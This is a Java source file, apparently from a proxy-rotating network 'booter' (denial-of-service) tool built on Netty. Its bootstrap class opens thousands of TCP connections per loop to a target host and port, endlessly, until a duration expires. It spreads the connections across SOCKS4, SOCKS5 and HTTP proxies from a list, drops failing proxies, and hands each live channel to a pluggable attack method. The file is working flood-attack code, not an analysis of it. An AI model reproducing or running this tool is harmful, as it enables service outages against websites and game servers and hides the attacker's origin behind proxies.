package me.nzxtercode.nettybooter.utils;

import java.net.InetAddress;
import java.util.Locale;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.atomic.AtomicLong;

import io.netty.bootstrap.Bootstrap;
import io.netty.channel.Channel;
import io.netty.channel.ChannelFutureListener;
import io.netty.channel.ChannelHandler;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.ChannelOption;
import io.netty.channel.EventLoopGroup;
import io.netty.channel.epoll.EpollEventLoopGroup;
import io.netty.channel.epoll.EpollSocketChannel;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.proxy.HttpProxyHandler;
import io.netty.handler.proxy.Socks4ProxyHandler;
import io.netty.handler.proxy.Socks5ProxyHandler;
import io.netty.util.ResourceLeakDetector;
import me.nzxtercode.nettybooter.NettyBooter;
import me.nzxtercode.nettybooter.methods.interfaces.IMethod;
import me.nzxtercode.nettybooter.proxy.Proxy;
import me.nzxtercode.nettybooter.proxy.ProxyManager;

/**
 * The type Netty bootstrap.
 */
public class NettyBootstrap {

	public static NettyBootstrap service;

	/**
	 * The constant METHOD.
	 */
	public final IMethod METHOD = NettyBooter.method;
	/**
	 * The constant LOADER.
	 */
	public final ProxyManager LOADER = new ProxyManager(NettyBooter.proxyFile);
	/**
	 * The constant REMOVE_NETWORK_PROXIES.
	 */
	public final boolean REMOVE_NETWORK_PROXIES = Boolean.parseBoolean(System.getProperty("rmnwp", "true"));
	private final long DELAY = Long.parseLong(System.getProperty("delay", "1"));
	private final int PER_DELAY = Integer.parseInt(System.getProperty("perdelay", "2500"));

	/**
	 * The constant success.
	 */
	public volatile int success = 0;
	/**
	 * The constant tryCount.
	 */
	public volatile int tryCount = 0;

	/**
	 * The Clazz.
	 */
	public final Class<? extends SocketChannel> CLAZZ = System.getProperty("os.name").toLowerCase().contains("win") ? NioSocketChannel.class : EpollSocketChannel.class;

	public NettyBootstrap() {
		NettyBootstrap.service = this;
	}

	/**
	 * Start.
	 *
	 * @throws Throwable the throwable
	 */
	@SuppressWarnings("deprecation")
	public void start() throws Throwable {
		ResourceLeakDetector.setEnabled(true);
		InetAddress inetHost = NettyBooter.resolved;
		int inetPort = NettyBooter.port;
		(new Thread(() -> {
			if (NettyBooter.duration < 1)
				NettyBooter.duration = 600;
			for (int i = 0; i < NettyBooter.duration; i++) {
				try {
					Thread.sleep(1000L);
				} catch (InterruptedException interruptedException) {
				}
				System.out
						.println("counting " + success + " connections but tried to connect " + tryCount + " channels");
				success = 0;
				tryCount = 0;
			}
			System.out.println("Duration is over shutting down...");
			System.exit(0);
		})).start();
		do {
			if (NettyBooter.proxyType == 0) {
				for (int i = 0; i < PER_DELAY; i++) {
					tryCount++;
					BOOTSTRAP.connect(inetHost, inetPort).addListener(NO_PROXY);
				}
			} else {
				for (int i = 0; i < PER_DELAY; i++) {
					tryCount++;
					BOOTSTRAP.connect(inetHost, inetPort);
				}
			}
			Thread.sleep(DELAY);
		} while (true);
	}

	/**
	 * The ThreadFactory.
	 */

	public ThreadFactory createThreadFactory(Thread.UncaughtExceptionHandler uncaughtExceptionHandler) {
		ThreadFactory threadFactory = Executors.defaultThreadFactory();
		AtomicLong atomicLong = new AtomicLong(0);
		return runnable -> {
			Thread thread = threadFactory.newThread(runnable);
			thread.setName(String.format(Locale.ROOT, "PoolThread-%d", atomicLong.getAndIncrement()));
			thread.setUncaughtExceptionHandler(uncaughtExceptionHandler);
			thread.setDaemon(true);
			return thread;
		};
	}

	/**
	 * The Group.
	 */
	public final EventLoopGroup GROUP = System.getProperty("os.name").toLowerCase().contains("win")
			? new NioEventLoopGroup(NettyBooter.threads, this.createThreadFactory((t, e) -> {
			}))
			: new EpollEventLoopGroup(NettyBooter.threads, this.createThreadFactory((t, e) -> {
			}));

	/**
	 * The Tail.
	 */
	public final ChannelHandler TAIL = new ChannelHandler() {
		public void handlerRemoved(ChannelHandlerContext arg0) {
		}

		public void handlerAdded(ChannelHandlerContext arg0) {
		}

		public void exceptionCaught(ChannelHandlerContext c, Throwable t) {
			c.close();
		}
	};

	/**
	 * The Http.
	 */
	public final ChannelInitializer<Channel> HTTP = new ChannelInitializer<Channel>() {
		public void channelInactive(ChannelHandlerContext ctx) {
			ctx.channel().close();
		}

		protected void initChannel(final Channel c) {
			try {
				final Proxy proxy = LOADER.getProxy();
				final HttpProxyHandler s = (proxy.email != null)
						? new HttpProxyHandler(proxy.address, proxy.email, proxy.pw)
						: new HttpProxyHandler(proxy.address);
				s.setConnectTimeoutMillis(5000L);
				s.connectFuture().addListener(f -> {
					if (f.isSuccess() && s.isConnected()) {
						METHOD.accept(c, proxy);
					} else {
						if (REMOVE_NETWORK_PROXIES)
							LOADER.disabledProxies.put(proxy, System.currentTimeMillis());
						c.close();
					}
				});
				c.pipeline().addFirst(s).addLast(TAIL);
			} catch (Exception e) {
				c.close();
			}
		}

		public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
			ctx.close();
		}
	};

	/**
	 * The Socks 5.
	 */
	public final ChannelInitializer<Channel> SOCKS5 = new ChannelInitializer<Channel>() {
		public void channelInactive(ChannelHandlerContext ctx) {
			ctx.channel().close();
		}

		protected void initChannel(final Channel c) {
			try {
				final Proxy proxy = LOADER.getProxy();
				final Socks5ProxyHandler s = (proxy.email != null)
						? new Socks5ProxyHandler(proxy.address, proxy.email, proxy.pw)
						: new Socks5ProxyHandler(proxy.address);
				s.setConnectTimeoutMillis(5000L);
				s.connectFuture().addListener(f -> {
					if (f.isSuccess() && s.isConnected()) {
						METHOD.accept(c, proxy);
					} else {
						if (REMOVE_NETWORK_PROXIES)
							LOADER.disabledProxies.put(proxy, System.currentTimeMillis());
						c.close();
					}
				});
				c.pipeline().addFirst(s).addLast(TAIL);
			} catch (Exception e) {
				c.close();
			}
		}

		public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
			ctx.close();
		}
	};

	/**
	 * The Socks 4.
	 */
	public final ChannelInitializer<Channel> SOCKS4 = new ChannelInitializer<Channel>() {
		public void channelInactive(ChannelHandlerContext ctx) {
			ctx.channel().close();
		}

		protected void initChannel(final Channel c) {
			try {
				final Proxy proxy = LOADER.getProxy();
				final Socks4ProxyHandler s = (proxy.email != null) ? new Socks4ProxyHandler(proxy.address, proxy.email)
						: new Socks4ProxyHandler(proxy.address);
				s.setConnectTimeoutMillis(5000L);
				s.connectFuture().addListener(f -> {
					if (f.isSuccess() && s.isConnected()) {
						METHOD.accept(c, proxy);
					} else {
						if (REMOVE_NETWORK_PROXIES)
							LOADER.disabledProxies.put(proxy, System.currentTimeMillis());
						c.close();
					}
				});
				c.pipeline().addFirst(s).addLast(TAIL);
			} catch (Exception e) {
				c.close();
			}
		}

		public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {
			ctx.close();
		}
	};

	/**
	 * The No proxy.
	 */
	public final ChannelFutureListener NO_PROXY = c -> {
		if (c.isSuccess())
			METHOD.accept(c.channel(), null);
	};

	/**
	 * The Bootstrap.
	 */
	public final Bootstrap BOOTSTRAP = (new Bootstrap()).channel(CLAZZ).group(GROUP)
			.option(ChannelOption.TCP_NODELAY, Boolean.TRUE).option(ChannelOption.AUTO_READ, Boolean.TRUE)
			.handler((NettyBooter.proxyType == 0) ? TAIL
					: ((NettyBooter.proxyType == 1) ? SOCKS5 : ((NettyBooter.proxyType == 2) ? SOCKS4 : HTTP)));
}
